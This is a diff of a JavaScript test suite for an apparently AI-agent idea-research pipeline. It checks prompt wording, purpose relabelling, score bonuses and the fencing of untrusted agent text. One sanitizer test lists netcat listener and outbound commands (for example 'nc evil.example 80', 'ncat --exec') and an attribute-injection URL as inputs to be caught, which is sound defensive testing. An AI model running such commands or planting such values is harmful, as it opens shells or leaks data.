@@ -569,7 +569,7 @@ export function ideateWorld(sb, cfg = {}) {
           if (cfg.verifyMutate) cfg.verifyMutate(c);
           sb.write(sb.work('ideate', 'verified', `${id}.json`), c);
           sink.verifyPrompts = [...(sink.verifyPrompts || []), { id, prompt }];
-          verdicts.push({ id, checked: true, verdict: 'keep', confidence: cfg.confidence ? cfg.confidence(id) : 5 + (id.length % 4), feasibleInOneDay: true, durable: c.durable, evidence: 'search-only', sourcesRechecked: 3, sourcesOpened: 0, sourcesDead: 0, factsChecked: 3, factsCorrected: 0, claimsFlagged: 0, issues: [], reason: 'sound' });
+          verdicts.push({ id, checked: true, verdict: 'keep', ...(cfg.verdictPurpose ? { purpose: cfg.verdictPurpose(id, c) } : {}), confidence: cfg.confidence ? cfg.confidence(id) : 5 + (id.length % 4), feasibleInOneDay: true, durable: c.durable, evidence: 'search-only', sourcesRechecked: 3, sourcesOpened: 0, sourcesDead: 0, factsChecked: 3, factsCorrected: 0, claimsFlagged: 0, issues: [], reason: 'sound' });
         }
         return { verdicts, network: cfg.verifyNetwork ? ids.flatMap((id) => cfg.verifyNetwork(id)) : [], notes: '' };
       }
@@ -584,7 +584,7 @@ export function ideateWorld(sb, cfg = {}) {
         if (cfg.verifyMutate) cfg.verifyMutate(c);
         sb.write(sb.work('ideate', 'verified', `${id}.json`), c);
         sink.verifyPrompts = [...(sink.verifyPrompts || []), { id, prompt }];
-        return { id, verdict: 'keep', confidence: cfg.confidence ? cfg.confidence(id) : 5 + (id.length % 4), feasibleInOneDay: true, durable: c.durable, evidence: 'search-only', sourcesRechecked: 3, sourcesOpened: 0, sourcesDead: 0, factsChecked: 3, factsCorrected: 0, claimsFlagged: 0, issues: [], network: cfg.verifyNetwork ? cfg.verifyNetwork(id) : [], reason: 'sound' };
+        return { id, verdict: 'keep', ...(cfg.verdictPurpose ? { purpose: cfg.verdictPurpose(id, c) } : {}), confidence: cfg.confidence ? cfg.confidence(id) : 5 + (id.length % 4), feasibleInOneDay: true, durable: c.durable, evidence: 'search-only', sourcesRechecked: 3, sourcesOpened: 0, sourcesDead: 0, factsChecked: 3, factsCorrected: 0, claimsFlagged: 0, issues: [], network: cfg.verifyNetwork ? cfg.verifyNetwork(id) : [], reason: 'sound' };
       }
       if (label.startsWith('network probe')) {
         sink.probePrompt = prompt;
@@ -1045,6 +1045,9 @@ describe('static checks', () => {
     assert.deepEqual(keys.sort(), [...ROLES].sort());
   });
 });
+// Words in the selfcheck's own scout prompt (short lens briefs, shared prelude included): r4a measured 2896 before the round that made
+// it shorter (about 2850 after). Raise this only on purpose, for a rule that earns its words.
+const SCOUT_WORD_CEILING = 2880;
 describe('ideate.js', () => {
   let sb;
   before(() => { sb = makeSandbox(); });
@@ -1133,6 +1136,9 @@ describe('ideate.js', () => {
         assert.equal(short.carryoverIn.title, carried.title, 'carryoverIn holds the idea that was carried in');
         assert.equal(short.carryoverIn.id, 'i07');
         assert.ok(run.rec.calls.some((x) => x.label === 'verify carry-1' && x.prompt.includes('carried over')));
+        // agent-written titles reach a prompt only inside a fence (r4a P19): the carried title in every scout prompt, none in a verifier heading
+        assert.ok(run.rec.calls.filter((x) => x.label.startsWith('scout ')).every((x) => x.prompt.includes(`<untrusted-research label="carried-over idea">\n${carried.title} (`)), 'the carried title is fenced');
+        assert.ok(run.rec.calls.filter((x) => x.label.startsWith('verify ')).every((x) => /^## Task: independently verify candidate \S+$/m.test(x.prompt) && !x.prompt.includes(`candidate carry-1 "`)), 'no title in the verifier heading');
         const a1 = playbookA1(s, { mode: 'shortlist', file: `work/${DATE}/ideas/shortlist.json` });
         assert.ok(a1);
         assert.equal(a1.ok, true, JSON.stringify(a1.problems));
@@ -1154,7 +1160,9 @@ describe('ideate.js', () => {
       const rev = short.ideas.find((i) => i.origin.scoutId === 'pulse-1');
       assert.ok(rev && rev.title.endsWith('Reborn') && rev.fingerprint.category === 'music-audio' && rev.fingerprint.purpose === 'tool', 'the revised tool is still wanted, so the floor keeps it');
       assert.ok(run.rec.logs.some((l) => l.includes('revised pulse-1 is now') && l.includes('Reborn') && l.includes('music-audio') && l.includes('purpose tool')), 'pool metadata follows the revised file');
-      assert.ok(run.rec.calls.find((c) => c.label === 'novelty reviser').prompt.includes('Keep each idea\'s purpose (fingerprint.purpose): a re-angled tool stays a tool'));
+      const reviser = run.rec.calls.find((c) => c.label === 'novelty reviser').prompt;
+      assert.ok(reviser.includes('Keep each idea\'s purpose (fingerprint.purpose): a re-angled tool stays a tool'));
+      assert.ok(reviser.includes('Write commands in words in every field (the sanitizer blanks a literal one)'), 'the reviser writes dossier fields too (r4a P8)');
     } finally { s.clean(); }
   });
 
@@ -1169,6 +1177,7 @@ describe('ideate.js', () => {
       const refill = run.rec.calls.filter((c) => /^scout \w+ r1$/.test(c.label));
       assert.ok(refill.length >= 2 && refill.every((c) => c.prompt.includes('so favour: ideas with a wanted purpose (tool or lesson): 0 of the 8 alive ideas have one, and never play')), refill.map((c) => c.prompt.split('\n').find((l) => l.startsWith('This is a refill round'))).join(' || '));
       assert.ok(refill.every((c) => !/slots with no candidate yet: [^;]*humor/.test(c.prompt)));
+      assert.ok(refill.every((c) => c.prompt.includes('<untrusted-research label="titles already proposed">')), 'the titles other scouts proposed are fenced');
       assert.equal(run.result.count, 10, `refill should have restored 10: ${JSON.stringify(run.result.notes)}`);
       s.clean();
       s = makeSandbox();
@@ -1342,6 +1351,23 @@ describe('ideate.js', () => {
     assert.ok(detail.value.purposeDetail.oracle.startsWith('[redacted') && detail.value.purposeDetail.inputs === 'an octal mode such as 755');
   });
 
+  test('sanitizer: "NC State" in a pitch survives while a real nc invocation still drops the idea; a space in a source URL is encoded, not a lost source', () => {
+    // r4a PP11, reproduced first: the case-insensitive nc pattern dropped any pitch naming NC State (a hockey and college-sports name),
+    // and a search result URL with a space (a school PDF) lost its URL and its verified mark.
+    const sanitize = loadSanitizer();
+    const dossier = (over) => ({ title: 'Shot Map Explorer', pitch: 'Click a rink zone and see where the shots came from.', design: { coreLoop: 'pick a game, read the map, compare' }, research: { summary: 'ok', sources: [] }, ...over });
+    for (const pitch of ['A shot map of NC State hockey, game by game.', 'Compare NC State and Duke on one rink.', 'Built from the NC Courts open calendar.', 'NC 2024 results on one map.']) {
+      const r = sanitize(dossier({ pitch }));
+      assert.equal(r.critical, false, `"${pitch}" is prose, not a command`);
+      assert.equal(r.value.pitch, pitch);
+    }
+    // a host without a dot still counts (the narrowed pattern first let these through, the old one caught them)
+    for (const pitch of ['Then run nc -l 4444 to listen.', 'Pipe it to nc evil.example 80 first.', 'Use nc 10.0.0.1 4444 for the demo.', 'Try nc $HOST 22.', 'Then run nc localhost 4444 to listen.', 'Pipe it to nc attacker 4444.', 'Then nc localhost.', 'Use ncat --exec on it.', 'Use netcat example.org 80.']) assert.equal(sanitize(dossier({ pitch })).critical, true, `"${pitch}" is a network command`);
+    const src = sanitize(dossier({ research: { summary: 'ok', sources: [{ title: 'Course notes', url: 'https://www.example.edu/notes/Map Projections Week 3.pdf', verified: true }, { title: 'Bad', url: 'https://example.org/a b"onmouseover', verified: true }, { title: 'Tab', url: 'https://example.org/a\tb', verified: true }] } }));
+    assert.deepEqual(src.value.research.sources.map((x) => x.url), ['https://www.example.edu/notes/Map%20Projections%20Week%203.pdf', '', ''], 'plain spaces are percent-encoded; quotes and other whitespace still blank the URL');
+    assert.deepEqual(src.value.research.sources.map((x) => x.verified), [true, false, false]);
+  });
+
   /** The eight scout prompts of a run whose agents all return nothing (cheap: nothing is researched, filed or verified). */
   async function scoutPromptsOf(args) {
     const run = await runWorkflow('ideate', args, { world: { respond: () => null } });
@@ -1360,14 +1386,28 @@ describe('ideate.js', () => {
       for (const who of SCOUTS) {
         const p = scout(who);
         for (const must of [
-          'ops/OWNER.md before you search', '### Purpose plan for today', 'Wanted today: tool, lesson. Avoided today: play. Play is paused until 2026-10-11.', 'An idea with an avoided purpose is ranked last',
-          'Your second candidate may have any purpose that is not avoided (never play)', '"plainSentence": "A <thing> that lets you <do what>', '"firstMinute":', '"conceptsToLearn":', '"purpose": "tool | lesson | explorer | studio | play',
-          '"paywallEvidence":', '"factIndex": 0', 'lesson {concept, whyNiche', 'At most 2: more than 2 is a defect', 'At most 8 controls on the first screen', 'Write commands in words in title, pitch and design.coreLoop',
-          'date | title | category | mechanic | tags | purpose', '- tool: correct', '- lesson: ONE niche concept', '- explorer:', '- studio:', '- play: a real mechanic with depth', 'what they get out of it', "the visitor's repeatable path",
-          'paywallEvidence points at it by factIndex',
+          `Read before you search: ${s.root}/ops/OWNER.md`, 'rubrics/research.md and', 'rubrics/safety.md.', 'skim CONTRACT sections 5, 10 and 11', 'Your file and its exact shape: "Output", at the end.',
+          'Where your persona file leans toward games, OWNER.md and the purpose section below win.', 'The brief is a lead, not evidence: check its factual claims by search',
+          '### Purpose plan for today', 'Wanted today: tool, lesson. Avoided today: play. Play is paused until 2026-10-11.', 'An idea with an avoided purpose is ranked last',
+          'Your second candidate may have any purpose that is not avoided (never play)', 'Your candidates are about different subjects: if your lens holds only one, make the second a neighbouring job in the same field.',
+          '"plainSentence": "A <thing> that lets you <do what>', '"firstMinute":', '"conceptsToLearn": ["an idea a newcomer must know before that first success', '"purpose": "tool | lesson | explorer | studio | play',
+          'conceptsToLearn: only the ideas a newcomer must know BEFORE that first success, ideally none or one; 2 is the ceiling and caps clarity near 5. What the page teaches goes in purposeDetail.',
+          'at most 8 controls on the first screen', 'the judges cap a metaphor-only title at clarity 4, below the bar to win', 'So write commands in words in every field, purposeDetail included', 'nor git push, clone, config, remote or credential',
+          '"tech": ["values from taxonomy.techSuggestions"]', 'the slot whose list in taxonomy.slots holds the category (wildcard for most tools and lessons)',
+          'date | title | category | mechanic | tags | purpose', '- tool: correct', '- lesson: ONE niche concept', '- explorer:', '- studio:', 'what they get out of it', "the visitor's repeatable path",
+          'About 8 to 10 searches per candidate', '(c) a result from the primary source\'s own official domain', 'copies of one story or one store listing count once',
+          'Tool and lesson evidence: each paywall claim', 'paywallEvidence[].factIndex, oracleFactIndex, misconceptionFactIndexes', 'If free options already do the job, say so in freeGap', 'an unverified paywall is never the reason to build',
         ]) assert.ok(p.includes(must), `scout ${who} lacks "${must}"`);
         assert.ok(!p.includes('Not a lorem-ipsum toy, not a pile of facts.') && !p.includes('why it is fun'), 'the game-shaped definition of a strong candidate is gone');
         assert.ok(!p.includes('manual override'), 'override null is no override');
+        // play is avoided today: no quality bar for it, no stock poker or hockey examples outside an interest lens, no 700-line bar for every purpose
+        for (const gone of ['- play: a real mechanic with depth', 'at least 700 lines of its own code', 'Literal commands, flags and variable names go only into purposeDetail', 'Roughly 10 searches in total', 'more than 2 is a defect of the idea']) assert.ok(!p.includes(gone), `scout ${who} still says "${gone}"`);
+        assert.equal(p.includes('poker ranges become an equity calculator'), /kind: interest\)/.test(p), `scout ${who}: the stock examples only for an interest lens`);
+        // the schema example spells out the purposeDetail of the purpose the scout leads with; the others sit in one line
+        const lesson = who === 'lab';
+        assert.equal(p.includes('"misconceptionFactIndexes": [1]'), lesson, `scout ${who}: the lesson example`);
+        assert.equal(p.includes('"oracleFactIndex": 1') && p.includes('"factIndex": 0'), !lesson, `scout ${who}: the tool example`);
+        assert.ok(p.includes(lesson ? 'the example above is a lesson): tool {job, audience, paywallEvidence:[{product, whatIsGated, factIndex}], freeGap, oracle, oracleFactIndex' : 'the example above is a tool): lesson {concept, whyNiche, audience, prerequisites:[], misconceptions:[], misconceptionFactIndexes:[]'), `scout ${who}: the other purposeDetail shapes`);
       }
       assert.ok(scout('cards').includes('Lens kind useful: a source of USEFUL TOOLS') && scout('cards').includes('Lead with a tool.') && scout('cards').includes('Your FIRST candidate is a tool.'));
       assert.ok(scout('lab').includes('Lens kind teach: a source of LESSONS') && scout('lab').includes('Lead with a lesson.') && scout('lab').includes('Your FIRST candidate is a lesson.'));
@@ -1375,7 +1415,13 @@ describe('ideate.js', () => {
       const lines = scout('cards').split('\n');
       assert.ok(lines[lines.findIndex((l) => l.startsWith('Lens: ')) + 1].startsWith('Lens kind useful:'), 'the kind sits next to the Lens line');
       const verify = run.rec.calls.find((c) => c.label.startsWith('verify ')).prompt;
-      for (const must of ['Do not change fingerprint.category, mechanic, slot or purpose', '7. Purpose facts', 'purposeDetail.oracle', 'paywallEvidence entry points (factIndex)', 'misconception is one people really hold', '8. Clarity fields', 'Fill a missing purposeDetail, plainSentence, firstMinute or conceptsToLearn', 'a tool for which no source of known correct answers exists']) assert.ok(verify.includes(must), `verify prompt lacks "${must}"`);
+      for (const must of [
+        'Do not change fingerprint.category, mechanic or slot (the novelty gate judged them)', 'Check fingerprint.purpose against what the visitor gets: an idea whose main point is fun is play even when it teaches something (a game dressed as a lesson), while a real tool or lesson keeps its label. Correct a wrong label and name the change in issues.',
+        '7. Purpose facts', 'purposeDetail.oracle', 'that oracleFactIndex points at', 'paywallEvidence entry points (factIndex)', 'when free options already do the job freeGap says so', 'each misconception is one people really hold, shown by the facts misconceptionFactIndexes point at',
+        '8. Clarity fields', 'Fill a missing purposeDetail, plainSentence, firstMinute or conceptsToLearn', 'Rewrite a title or plainSentence that hides what the thing is', 'conceptsToLearn lists every idea a newcomer must know before the first success',
+        'a tool for which no source of known correct answers exists', 'copies of one story or one store listing count once', 'or when a result from its primary source\'s own official domain states it (research.md, case c, which refines the standing rule above)', 'verdict, purpose (fingerprint.purpose as you leave it)', 'shell commands are blanked, so write commands in words',
+      ]) assert.ok(verify.includes(must), `verify prompt lacks "${must}"`);
+      assert.ok(!verify.includes('slot or purpose (the novelty gate and the purpose plan already judged them)'), 'the verifier may correct a dishonest purpose label');
       const short = s.json(s.work('ideas', 'shortlist.json'));
       assert.ok(short.ideas.every((i) => i.plainSentence && i.firstMinute && Array.isArray(i.conceptsToLearn) && i.scores.clarity === 0), 'the shortlist keeps the clarity fields');
       assert.ok(run.rec.logs.includes('purpose plan: wanted tool, lesson; avoided play; play paused until 2026-10-11'), run.rec.logs.filter((l) => l.startsWith('purpose plan')).join(' | '));
@@ -1410,6 +1456,78 @@ describe('ideate.js', () => {
         assert.ok(prompt('cards').includes('Lens kind useful') && prompt('cards').includes('Lead with a tool.'), 'without a plan a useful lens still leads with a tool');
       }
     } finally { s.clean(); }
+  });
+
+  test('scout prompt: a search budget per candidate (fewer on a narrow machine), different subjects whenever there are two candidates (plan or none), the play bar only when play may win, and a word ceiling', async () => {
+    const s = makeSandbox();
+    try {
+      const words = (p) => p.split(/\s+/).filter(Boolean).length;
+      const wide = await scoutPromptsOf(baseArgs(s));
+      const narrow = await scoutPromptsOf(baseArgs(s, { maxAgents: 2, osHeartbeat: true }));
+      for (const who of SCOUTS) {
+        assert.ok(wide.prompt(who).includes('About 8 to 10 searches per candidate; do not browse aimlessly.'), who);
+        assert.ok(narrow.prompt(who).includes('About 6 to 8 searches per candidate; do not browse aimlessly.') && narrow.prompt(who).includes('Budget about 12 minutes per candidate'), who);
+      }
+      // r4a: the scout prompt grew from 2106 to 2896 words with the purpose rules; this round carries more rules in fewer words, and keeps it there
+      const counts = SCOUTS.map((who) => words(wide.prompt(who)));
+      assert.ok(Math.max(...counts) <= SCOUT_WORD_CEILING, `scout prompts run to ${counts.join(', ')} words (ceiling ${SCOUT_WORD_CEILING})`);
+      const one = await scoutPromptsOf(baseArgs(s, { phaseBudgetMinutes: 20 }));
+      assert.ok(one.prompt('pulse').includes('propose ONE candidate project') && !one.prompt('pulse').includes('different subjects') && !one.prompt('pulse').includes('Your second candidate'), 'one candidate: no second-candidate rules');
+      const mixNoPlan = { ...baseArgs(s).mix };
+      delete mixNoPlan.purposes;
+      const none = await scoutPromptsOf(baseArgs(s, { mix: mixNoPlan }));
+      assert.ok(none.prompt('pulse').includes('Your candidates are about different subjects') && none.prompt('pulse').includes('- play: a real mechanic with depth'), 'no plan: the two candidates still differ in subject, and play may win');
+      const allowed = await scoutPromptsOf(baseArgs(s, { mix: { ...baseArgs(s).mix, purposes: purposePlan({ avoid: [], playAllowed: true, playBlockedUntil: null }) } }));
+      assert.ok(allowed.prompt('pulse').includes('- play: a real mechanic with depth'), 'play allowed: its quality bar is back');
+    } finally { s.clean(); }
+  });
+
+  test('a verifier that finds a game dressed as a lesson relabels it play and the pool follows, so it loses its wanted place; a confirmed or empty label changes nothing; with the page contract armed or not', async () => {
+    // r4a P12: a game framed as "an interactive lesson" took the wanted-purpose place and bonus; the label is now checked against what the visitor gets
+    // the contract not armed on a wide machine (one verifier per idea), armed on a narrow one (batched verifiers)
+    for (const [requiredFrom, extra] of [[null, {}], [DATE, { maxAgents: 2, osHeartbeat: true }]]) {
+      const s = makeSandbox();
+      try {
+        const cfg = s.json(s.p('config.json'));
+        s.write(s.p('config.json'), { ...cfg, pageContract: { ...(cfg.pageContract || {}), requiredFrom } });
+        const w = ideateWorld(s, {
+          mutate: (c) => { c.fingerprint.purpose = c.id === 'pulse-1' ? 'lesson' : c.id === 'cards-1' ? 'tool' : 'explorer'; },
+          // pulse-1 is the best-rated idea, so only the relabel keeps it out of the wanted floor
+          confidence: (id) => (id === 'pulse-1' ? 9 : 6),
+          verifyMutate: (c) => { if (c.id === 'pulse-1') c.fingerprint.purpose = 'play'; },
+          verdictPurpose: (id, c) => (id === 'pulse-1' ? 'play' : id === 'lab-1' ? '' : c.fingerprint.purpose),
+        });
+        const run = await go('ideate', baseArgs(s, extra), w);
+        checkRunInvariants('ideate', run);
+        assert.equal(run.result.ok, true, `requiredFrom ${requiredFrom}: ${JSON.stringify(run.result).slice(0, 300)}`);
+        assert.equal(run.rec.calls.some((c) => c.label.startsWith('verify-batch ')), Boolean(extra.maxAgents), 'both verifier paths are covered');
+        // both verifier prompts carry the label check, and case (c) of research.md says it refines the prelude's two-way rule
+        const vp = run.rec.calls.find((c) => /^verify(-batch)? /.test(c.label)).prompt;
+        for (const must of ['Check fingerprint.purpose against what the visitor gets', 'states it (research.md, case c, which refines the standing rule above)', 'purpose (fingerprint.purpose as you leave it)']) assert.ok(vp.includes(must), `${extra.maxAgents ? 'batch' : 'single'} verifier lacks "${must}"`);
+        assert.deepEqual(run.rec.logs.filter((l) => l.startsWith('verifier relabelled')), ['verifier relabelled pulse-1: purpose lesson -> play']);
+        const short = s.json(s.work('ideas', 'shortlist.json'));
+        assert.ok(!short.ideas.some((i) => i.origin.scoutId === 'pulse-1') && run.result.dropped.some((d) => d.stage === 'shortlist' && d.id === 'pulse-1'), 'the relabelled play idea ranks last and is surplus');
+        assert.equal(run.result.purposes.shortlistedWanted, 1, 'only the real tool counts as wanted');
+      } finally { s.clean(); }
+    }
+  });
+
+  test('research.md and the scout roles say what the scouts and verifiers are told: three ways to verify, the formula oracle, fact indexes, an honest freeGap, purpose-neutral scout paragraphs', () => {
+    const read = (...p) => fs.readFileSync(path.join(REAL_REPO, ...p), 'utf8');
+    const r = read('ops', 'rubrics', 'research.md');
+    for (const must of [
+      '**`verified: true` means one of three things.**', '(c) A result from the **primary source on its own official domain**', 'so are sites copying one store listing', 'A lens brief is a lead, not evidence',
+      'About 8 to 10 searches per candidate (6 to 8 on a narrow machine)', 'plain spaces are percent-encoded', 'a closed-form formula from a named standard is an oracle too', 'is a regression check, not an oracle',
+      '`purposeDetail.oracleFactIndex`', '`purposeDetail.misconceptionFactIndexes`', '`freeGap` says so and names the real remaining gap', 'corrects a dishonest label (a game dressed as a lesson is `play`)',
+    ]) assert.ok(r.includes(must), `research.md lacks "${must}"`);
+    assert.ok(!r.includes('Roughly 10 searches per scout'), 'research.md keeps the old search budget');
+    for (const role of SCOUTS) {
+      const text = read('ops', 'roles', `${role}.md`);
+      const scout = text.slice(text.indexOf('## As a scout'), text.indexOf('## As a judge'));
+      assert.ok(scout.includes("`verified:true` needs an opened page, two independent agreeing results or the primary source's own page"), `${role}.md: the verified clause`);
+      for (const m of scout.matchAll(/two independent[^.;]*/g)) assert.ok(m[0].includes("the primary source's own page"), `${role}.md names only two of the three ways to verify: "${m[0]}"`);
+      for (const gone of ['creates emergent play', 'Design for play', 'the joke that is also a game or a tool', 'play with its numbers']) assert.ok(!scout.includes(gone), `${role}.md still pulls its scouts toward games: "${gone}"`);
+    }
   });
 
   test('a dev-tool title such as "Chmod Calculator" is filed and shortlisted; a pitch that names a command is still dropped', async () => {
@@ -1713,15 +1831,15 @@ describe('select.js', () => {
       assert.ok(doc.rationale.includes('78 from the judges plus the 5-point bonus for a wanted purpose, tool'));
       assert.ok(run.rec.logs.some((l) => l.startsWith('purpose missing for ') && l.includes('i01')), 'an idea without a purpose is logged');
       assert.ok(run.rec.logs.some((l) => l.startsWith('purpose plan: wanted tool, lesson (+5 points each), avoided play')));
-      // the bonus never lifts an idea over the carry floor: i02 judged 57.7 (62.7 with the bonus) passes every other carry rule
+      // the bonus never lifts an idea over the carry floor: i02 judged 56.7 (61.7 with the bonus it earns at clarity 7) passes every other carry rule
       const t = makeSandbox();
       try {
         seedShortlist(t, { purpose: { i01: 'tool', i02: 'lesson' }, durable: () => true });
-        const i02 = (k) => (k === 'feasibility' || k === 'safety' ? 6 : 5.7);
+        const i02 = (k) => (k === 'feasibility' || k === 'safety' ? 6 : k === 'clarity' ? 7 : 5.2);
         const low = await go(t, selectWorld(t, { scoreOf: (k, id) => (id === 'i01' ? 9 : id === 'i02' ? i02(k) : k === 'feasibility' ? 3 : undefined) }));
         checkRunInvariants('select', low);
         const r2 = Object.fromEntries(low.result.ranking.map((r) => [r.id, r]));
-        assert.deepEqual([r2.i02.baseTotal, r2.i02.total, r2.i02.eligible], [57.7, 62.7, true]);
+        assert.deepEqual([r2.i02.baseTotal, r2.i02.total, r2.i02.eligible], [56.7, 61.7, true]);
         assert.ok(r2.i02.total >= W().gates.carryMinTotal && r2.i02.baseTotal < W().gates.carryMinTotal);
         assert.equal(low.result.carryoverOutId, null, 'the carry-over floor reads baseTotal, never the bonus');
       } finally { t.clean(); }
@@ -1761,6 +1879,69 @@ describe('select.js', () => {
     } finally { s.clean(); }
   });
 
+  test('the purpose bonus needs clarity 7 or an unscored clarity: a murky wanted idea is judged on its own total, and the log and its rejected note say why', async () => {
+    // r4a P6: one clarity point is worth about 1.5 total points, so an unconditional +5 let a wanted idea at clarity 5 beat a clear one at 8
+    const s = makeSandbox();
+    try {
+      seedShortlist(s, { purpose: { i01: 'tool', i02: 'lesson', i03: 'tool' }, durable: () => true });
+      const scoreOf = (k, id) => ({ i01: k === 'clarity' ? 6.9 : 8, i02: k === 'clarity' ? 7 : 7.8, i03: 7.5, i04: 8.2 })[id] ?? (k === 'feasibility' ? 3 : undefined);
+      const run = await go(s, selectWorld(s, { scoreOf, skip: (k, id) => k === 'clarity' && id === 'i03' }));
+      checkRunInvariants('select', run);
+      const rank = Object.fromEntries(run.result.ranking.map((r) => [r.id, r]));
+      assert.deepEqual([rank.i01.baseTotal, rank.i01.purposeBonus, rank.i01.total], [78.3, 0, 78.3], 'clarity 6.9: no bonus for the wanted tool');
+      assert.deepEqual([rank.i02.purposeBonus, rank.i02.total], [5, 81.8], 'clarity exactly 7 earns the bonus');
+      assert.deepEqual([rank.i03.purposeBonus, rank.i03.total], [5, 80], 'an unscored clarity is no reason to withhold it');
+      assert.deepEqual([rank.i04.purposeBonus, rank.i04.total], [0, 82], 'no purpose, no bonus');
+      assert.equal(run.result.chosenId, 'i04', 'the clear idea without a purpose beats the murky wanted one');
+      assert.deepEqual(JSON.parse(JSON.stringify(run.result.ranking.slice(0, 4).map((r) => r.id))), ['i04', 'i02', 'i03', 'i01']);
+      assert.equal(W().gates.bonusMinClarity, 7, 'the rubric documents the threshold the script applies');
+      assert.ok(run.rec.logs.some((l) => l.startsWith('purpose bonus withheld for i01 (clarity 6.9 < 7)')), run.rec.logs.filter((l) => l.includes('withheld')).join(' | '));
+      const doc = s.json(s.p('state', 'ideas', `${DATE}.json`));
+      const note = doc.rejectedNotes.find((x) => x.title === doc.ideas.find((i) => i.id === 'i01').title).reason;
+      assert.ok(note.includes('78.3/100 (no purpose bonus: clarity 6.9 < 7)'), note);
+      assert.deepEqual(doc.winnerNotes.purpose, { purpose: null, wanted: ['tool', 'lesson'], avoid: ['play'], bonus: 5, bonusApplied: 0, baseTotal: 82 });
+      // without a plan nobody gets a bonus, whatever the clarity
+      const t = makeSandbox();
+      try {
+        seedShortlist(t, { purpose: { i01: 'tool', i02: 'lesson', i03: 'tool' } });
+        const args = baseArgs(t);
+        delete args.mix.purposes;
+        const none = await runWorkflow('select', args, { world: selectWorld(t, { scoreOf }) });
+        checkRunInvariants('select', none);
+        assert.ok(none.result.ranking.every((r) => r.purposeBonus === 0 && r.total === r.baseTotal));
+        assert.ok(!none.rec.logs.some((l) => l.includes('withheld')), 'no plan: nothing is withheld either');
+      } finally { t.clean(); }
+    } finally { s.clean(); }
+  });
+
+  test('clarity judges the words a stranger meets: it counts the concepts itself and caps a metaphor-only title at 4, and only its calibration line drops "as researched"', async () => {
+    // r4a P7: clarity was scored from the scout's own conceptsToLearn under a calibration rule that told every judge to look past the words
+    for (const narrow of [false, true]) {
+      const s = makeSandbox();
+      try {
+        seedShortlist(s);
+        const run = await go(s, selectWorld(s), {}, narrow ? { maxAgents: 2, osHeartbeat: true } : {});
+        checkRunInvariants('select', run);
+        const judges = run.rec.calls.filter((c) => c.label.startsWith('judge '));
+        const clarity = judges.find((c) => /^judge (clarity|safety\+clarity) /.test(c.label)).prompt;
+        for (const must of ['Count yourself the concepts a newcomer must grasp before that first success', 'what a lesson teaches afterwards does not count', 'score your count when it is higher than conceptsToLearn', 'A title that names no literal thing (a metaphor alone, like "Orbital Knitwear") caps clarity at 4']) assert.ok(clarity.includes(must), `${narrow ? 'narrow' : 'wide'} clarity judge lacks "${must}"`);
+        assert.ok(narrow
+          ? clarity.includes('Judge the idea as researched, not the pitch language, except for clarity, which judges the words a stranger meets (title, plainSentence, firstMinute).')
+          : clarity.includes('Judge the words a stranger meets (title, plainSentence, firstMinute), not the research behind them.') && !clarity.includes('Judge the idea as researched'), 'the clarity calibration carve-out');
+        for (const j of judges.filter((c) => !c.label.includes('clarity'))) assert.ok(j.prompt.includes('Judge the idea as researched, not the pitch language. Do not compare yourself'), `${j.label} keeps "as researched" without the exception`);
+        // the scout-written titles reach every judge only inside the fence (r4a P19)
+        const titles = s.json(s.work('ideas', 'shortlist.json')).ideas.map((i) => i.title);
+        for (const j of judges) {
+          const fence = j.prompt.indexOf('<untrusted-research label="idea titles from the shortlist">');
+          assert.ok(fence > 0 && titles.every((t) => j.prompt.indexOf(t) > fence), `${j.label}: every title sits inside the fence`);
+        }
+      } finally { s.clean(); }
+    }
+    const rubric = fs.readFileSync(path.join(REAL_REPO, 'ops', 'rubrics', 'selection.md'), 'utf8');
+    for (const must of ['clarity is the exception and judges the words a stranger meets', 'Count yourself the concepts a newcomer must grasp before the first success', 'caps clarity at 4', 'when its clarity is at least `bonusMinClarity` (7) or unscored']) assert.ok(rubric.includes(must), `selection.md lacks "${must}"`);
+    for (const role of ['cards', 'critic']) assert.ok(fs.readFileSync(path.join(REAL_REPO, 'ops', 'roles', `${role}.md`), 'utf8').includes('a title that names no literal thing'), `${role}.md: the clarity judge line`);
+  });
+
   test('no purpose plan: the selection is unchanged (no bonus, nothing avoided) and says so; judges read OWNER.md and the purpose; the critic asks the purpose questions', async () => {
     const s = makeSandbox();
     try {
@@ -1796,9 +1977,9 @@ describe('select.js', () => {
         assert.ok(ask('delight').includes('save a real hour') && ask('delight').includes('aha moment'));
         assert.ok(ask('interestFit').includes('a faithful free version of a gated tool, a lesson on a niche concept, and a simple game with a familiar hook like day 3'));
         assert.ok(ask('safety').includes('clean-room rules') && ask('safety').includes('never a form that takes a real password'));
-        assert.ok(ask('clarity').includes('plainSentence, firstMinute and conceptsToLearn') && ask('clarity').includes('ten seconds'));
+        assert.ok(ask('clarity').includes('title, plainSentence and firstMinute') && ask('clarity').includes('conceptsToLearn') && ask('clarity').includes('ten seconds'));
         const cp = p.rec.challengePrompts.find((c) => c.label.startsWith('challenge ')).prompt;
-        for (const must of ['ops/OWNER.md', 'would a tool give a wrong answer', 'Would a lesson teach a wrong thing', 'Would the paywall claim embarrass us', 'Could a stranger say what this is after ten seconds', 'a premise so opaque that no plain title and intro would let a stranger say what it is', '(purpose tool, total']) assert.ok(cp.includes(must), `critic prompt lacks "${must}"`);
+        for (const must of ['ops/OWNER.md', 'would a tool give a wrong answer', 'Would a lesson teach a wrong thing', 'Would the paywall claim embarrass us', 'Could a stranger say what this is after ten seconds (read its title, plainSentence and firstMinute)', 'a premise so opaque that no plain title and intro would let a stranger say what it is', '(purpose tool, total']) assert.ok(cp.includes(must), `critic prompt lacks "${must}"`);
       } finally { t.clean(); }
     } finally { s.clean(); }
   });
@@ -5027,8 +5208,8 @@ describe('ideate.js: research under a restricted network (search-only evidence, 
     try {
       const scout = world.sink.scoutPrompts[0].prompt;
       for (const must of [
-        'WebSearch works, WebFetch mostly does not', 'title, URL, date', 'via is "opened" ONLY if WebFetch returned the page text', 'Never say you opened a page you did not',
-        'at least two INDEPENDENT search results', 'alsoIn', 'One snippet, an old snapshot or anything from memory is verified:false', '"as of <date>, per <source>"',
+        'Build your evidence from WebSearch results (WebFetch mostly fails here)', 'title, URL, date', 'via is "opened" ONLY if WebFetch returned the page text', 'never say you opened a page you did not',
+        'at least two INDEPENDENT search results', 'alsoIn', 'Anything else is verified:false; case (c) refines the standing rule above.', '"as of <date>, per <source>"',
         'at most once per host per day', 'sourcesRecorded', 'network = every host you tried WebFetch on', '"snippet": "', '"via": "',
       ]) assert.ok(scout.includes(must) || scout.includes(must.replace(/"/g, '\\"')), `scout prompt lacks "${must}"`);
